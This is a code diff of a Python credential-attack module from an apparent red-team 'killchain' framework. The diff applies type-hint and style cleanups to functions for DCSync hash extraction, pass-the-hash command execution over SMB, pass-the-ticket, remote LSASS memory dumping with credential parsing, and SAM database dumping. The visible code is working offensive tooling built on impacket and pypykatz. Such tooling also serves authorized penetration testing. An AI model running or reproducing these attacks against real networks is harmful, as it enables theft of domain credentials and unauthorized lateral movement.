@@ -16,7 +16,7 @@ import logging
 import os
 import shutil
 import subprocess
-from typing import Dict, Optional
+from typing import Optional
 
 # ── Logging ──────────────────────────────────────────────────────────────
 logger = logging.getLogger("octopus.killchain.ad.credential")
@@ -37,13 +37,11 @@ IMPACKET_TIMEOUT = 180
 CLI_TIMEOUT = 300
 
 
-# ═══════════════════════════════════════════════════════════════════════════
 # Internal helpers
-# ═══════════════════════════════════════════════════════════════════════════
 
-def _normalize_creds(creds: Optional[Dict[str, str]]) -> Dict[str, str]:
+def _normalize_creds(creds: Optional[dict[str, str]]) -> dict[str, str]:
     """Return a dict with guaranteed keys: user, password, domain, nthash."""
-    defaults: Dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
+    defaults: dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
     if creds:
         defaults.update(creds)
     return defaults
@@ -73,7 +71,7 @@ def _run_cli(cmd: str, timeout: int = CLI_TIMEOUT) -> str:
         return f"[!] Command error: {exc}"
 
 
-def _impacket_auth_string(creds: Dict[str, str]) -> str:
+def _impacket_auth_string(creds: dict[str, str]) -> str:
     """Build ``DOMAIN/user:password`` string for impacket CLI tools."""
     domain = creds["domain"]
     user = creds["user"]
@@ -83,11 +81,9 @@ def _impacket_auth_string(creds: Dict[str, str]) -> str:
     return f"{user}:{password}"
 
 
-# ═══════════════════════════════════════════════════════════════════════════
 # DCSync
-# ═══════════════════════════════════════════════════════════════════════════
 
-def dcsync(target: str, creds: Optional[Dict[str, str]] = None) -> str:
+def dcsync(target: str, creds: Optional[dict[str, str]] = None) -> str:
     """Perform a DCSync attack via impacket's ``secretsdump``.
 
     Extracts all domain password hashes by replicating the NTDS.dit
@@ -186,9 +182,7 @@ def dcsync(target: str, creds: Optional[Dict[str, str]] = None) -> str:
     return output
 
 
-# ═══════════════════════════════════════════════════════════════════════════
 # Pass-the-Hash
-# ═══════════════════════════════════════════════════════════════════════════
 
 def pass_the_hash(target: str, user: str, nthash: str,
                   domain: str = "", command: str = "whoami") -> str:
@@ -222,16 +216,14 @@ def pass_the_hash(target: str, user: str, nthash: str,
         smb = SMBConnection(target, target, sess_port=445, timeout=30)
         smb.login(user, "", domain, lmhash="", nthash=nthash)
 
-        output += f"[+] SMB authentication successful via PTH\n"
+        output += "[+] SMB authentication successful via PTH\n"
         output += f"    User:   {domain}\\{user}\n"
         output += f"    Hash:   {nthash[:8]}...{nthash[-8:]}\n"
         print(f"    {C_GREEN}[+] PTH authentication succeeded!{C_RESET}")
 
         # Execute command via impacket
         try:
-            from impacket.smbconnection import SMBConnection as _SC  # noqa: F811
             from impacket.examples.smbexec import SMBEXEC  # type: ignore[import-untyped]
-
             executer = SMBEXEC(
                 command, username=user, password="",
                 domain=domain, hashes=f":{nthash}",
@@ -261,7 +253,7 @@ def pass_the_hash(target: str, user: str, nthash: str,
             f'{cli_bin} -hashes :{nthash} '
             f'"{domain_prefix}{user}@{target}" -codec utf-8'
         )
-        output += f"(via CLI — interactive shell)\n"
+        output += "(via CLI — interactive shell)\n"
         output += f"  Command: {cmd}\n"
         output += "[!] Use interactively or pipe commands.\n"
     else:
@@ -270,9 +262,7 @@ def pass_the_hash(target: str, user: str, nthash: str,
     return output
 
 
-# ═══════════════════════════════════════════════════════════════════════════
 # Pass-the-Ticket
-# ═══════════════════════════════════════════════════════════════════════════
 
 def pass_the_ticket(target: str, ticket_file: str,
                     command: str = "whoami") -> str:
@@ -339,11 +329,9 @@ def pass_the_ticket(target: str, ticket_file: str,
     return output
 
 
-# ═══════════════════════════════════════════════════════════════════════════
 # LSASS dump
-# ═══════════════════════════════════════════════════════════════════════════
 
-def dump_lsass(target: str, creds: Optional[Dict[str, str]] = None) -> str:
+def dump_lsass(target: str, creds: Optional[dict[str, str]] = None) -> str:
     """Remotely dump LSASS process memory to extract credentials.
 
     Uses impacket to upload and execute procdump or comsvcs.dll MiniDump,
@@ -435,7 +423,7 @@ def dump_lsass(target: str, creds: Optional[Dict[str, str]] = None) -> str:
                 logger.info("Parsing LSASS dump with pypykatz")
                 parsed = pypykatz.parse_minidump_file(local_dump)
                 output += "\n[EXTRACTED CREDENTIALS]\n" + "-" * 40 + "\n"
-                for luid, session in parsed.logon_sessions.items():
+                for _luid, session in parsed.logon_sessions.items():
                     if session.username and session.username != "(null)":
                         output += f"  {session.domain}\\{session.username}\n"
                         if session.lm_hash:
@@ -473,11 +461,9 @@ def dump_lsass(target: str, creds: Optional[Dict[str, str]] = None) -> str:
     return output
 
 
-# ═══════════════════════════════════════════════════════════════════════════
 # SAM dump
-# ═══════════════════════════════════════════════════════════════════════════
 
-def sam_dump(target: str, creds: Optional[Dict[str, str]] = None) -> str:
+def sam_dump(target: str, creds: Optional[dict[str, str]] = None) -> str:
     """Remotely dump the SAM database (local account hashes).
 
     Uses impacket's ``secretsdump`` targeting SAM+SYSTEM+SECURITY
